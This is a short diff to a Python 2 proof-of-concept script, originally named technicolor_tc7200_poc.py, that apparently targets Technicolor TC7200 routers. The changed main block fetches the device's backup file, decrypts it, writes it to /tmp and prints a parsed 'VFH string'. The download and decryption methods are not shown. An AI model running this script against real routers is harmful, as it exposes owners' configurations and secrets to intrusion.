@@ -50,7 +50,9 @@ class Technicolor:
 
 if __name__ == '__main__':
     if len(sys.argv) < 2:
-        print 'technicolor_tc7200_poc.py addr [port]'
+        print 'Usage: vfh.py address [port]'
+        print 'Example: python vfh 192.168.0.1\n'
+        exit(0)
     address = sys.argv[1]
     port = 80
     if len(sys.argv) == 3:
@@ -58,7 +60,7 @@ if __name__ == '__main__':
     t = Technicolor(address, port)
     backup = t.download_backup_file()
     if len(backup) > 0:
-        open('test.enc', 'wb').write(backup)
+        open('/tmp/test.enc', 'wb').write(backup)
         plain = t.decrypt_backup(backup)
-        open('test.dec', 'wb').write(plain)
+        open('/tmp/test.dec', 'wb').write(plain)
         print 'VFH string: %s' % t.parse_backup(plain)
